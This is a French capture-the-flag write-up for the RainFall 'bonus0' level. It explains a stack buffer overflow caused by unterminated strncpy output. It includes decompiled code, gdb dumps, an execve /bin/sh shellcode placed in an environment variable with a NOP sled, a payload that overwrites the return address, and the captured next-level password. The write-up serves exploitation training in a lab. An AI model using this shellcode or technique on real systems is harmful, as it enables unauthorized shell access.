# **Bonus 0**

Pour le `bonus0`, on decompile le code

```
void p(char *param_1,char *param_2)
{
  char *pcVar1;
  char local_100c [4104];
  
  puts(param_2);
  read(0,local_100c,0x1000);
  pcVar1 = strchr(local_100c,10);
  *pcVar1 = '\0';
  strncpy(param_1,local_100c,0x14);
  return;
}

void pp(char *param_1)
{
  char cVar1;
  uint uVar2;
  char *pcVar3;
  byte bVar4;
  char local_34 [20];
  char local_20 [20];
  
  bVar4 = 0;
  p(local_34,&DAT_080486a0);
  p(local_20,&DAT_080486a0);
  strcpy(param_1,local_34);
  uVar2 = 0xffffffff;
  pcVar3 = param_1;
  do {
    if (uVar2 == 0) break;
    uVar2 = uVar2 - 1;
    cVar1 = *pcVar3;
    pcVar3 = pcVar3 + (uint)bVar4 * -2 + 1;
  } while (cVar1 != '\0');
  *(undefined2 *)(param_1 + (~uVar2 - 1)) = 0x20;
  strcat(param_1,local_20);
  return;
}

undefined4 main(void)
{
  char local_3a [54];
  
  pp(local_3a);
  puts(local_3a);
  return 0;
}
```

Le programme lit l'input de l'utilisateur sur 4096 caracteres et remplace le premier `\n` par un `\0` et recupere les 20 premiers caracteres pour les stocker dans
un buffer, mais si le premier `\n` n'est pas dans les 20 premiers caractere alors le buffer ne contients pas forcement de `\0`

Le programme fais cela deux fois puis concatene les deux chaines en mettant un espace entre les deux, sachant que le buffer de destination fais 54 caracteres
Cependant, comme les string ne sont pas fini correctement, le premier strcpy ecrit le premier buffer + tout ce qu'il y a derriere tant qu'il ne rencontre pas de `\0`

```
(gdb) run 
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/bonus0/bonus0 
 - 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 - 
bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb

Breakpoint 1, 0x0804854c in pp ()
(gdb) x/64wx $esp
0xbffff460:	0xbffff49c	0x080486a0	0x00000000	0xb7fd0ff4
0xbffff470:	0xbffff4be	0xbffff4bf	0x00000001	0xb7ec3c49
0xbffff480:	0xbffff4bf	0xbffff4be	0x61616161	0x61616161
0xbffff490:	0x61616161	0x61616161	0x61616161	0x62626262
0xbffff4a0:	0x62626262	0x62626262	0x62626262	0x62626262
0xbffff4b0:	0xb7fd0ff4	0x00000000	0xbffff508	0x080485b9
0xbffff4c0:	0xbffff4d6	0x080498d8	0x00000001	0x0804835d
```

Comme notre premiere et seconde chaines sontcolle dans la memoire, plus 4 bits != 0, la premiere chaine ecrit `44` caracteres
sachant que le code rajoute un espace, il ne reste que `9` caracteres avant d'overflow

```
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/bonus0/bonus0 
 - 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 - 
ABCDEFGHIJKLMNOPQRSTUVWXYZ

(gdb) n
Single stepping until exit from function main,
which has no line number information.
aaaaaaaaaaaaaaaaaaaaABCDEFGHIJKLMNOPQRST��� ABCDEFGHIJKLMNOPQRST���

Breakpoint 2, 0x080485cb in main ()
(gdb) si
0x4d4c4b4a in ?? ()

```

Donc nous pouvons reecrire `eip` a la place de `JKLM` soit apres le 9eme caractere de la deuxieme chaine

Comme nous n'avons pas beaucoup de place pour ecrire notre `shellcode`, nous allons utiliser l'environnement

```
bonus0@RainFall:~$ export SHELLCODE=$(python -c "print'\x90'*500+'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'")
```

Nous ecrivons notre shellcode precede de `\x90 (nop)` dans l'environnement
Puis nous recuperons l'addresse de notre variable

```
bonus0@RainFall:~$ cat /var/crash/getenvaddr.c 
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv, char **env)
{
	printf("Addr of %s = %p\n", argv[argc-1], getenv(argv[argc - 1]));
}
bonus0@RainFall:~$ cd -
/var/crash
bonus0@RainFall:/var/crash$ ./a.out SHELLCODE
Addr of SHELLCODE = 0xbffff6ff

```
Nous tapons alors au milieu des NOP, pour prevenir d'eventuelle changement dans la stack soit en `0xbffff7ff`
Nous ecrivons alors notre payload

```
bonus0@RainFall:~$ python -c "print'a'*4095+'\n'+'b'*9+'\xff\xf7\xff\xbf'+'c'*7" > /var/crash/file 
bonus0@RainFall:~$ cat /var/crash/file - | ./bonus0 
 - 
 - 
aaaaaaaaaaaaaaaaaaaabbbbbbbbb����ccccccc��� bbbbbbbbb����ccccccc���
id
uid=2010(bonus0) gid=2010(bonus0) euid=2011(bonus1) egid=100(users) groups=2011(bonus1),100(users),2010(bonus0)
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

> ### NEXT : [Bonus1](/bonus1/resources/README.md)
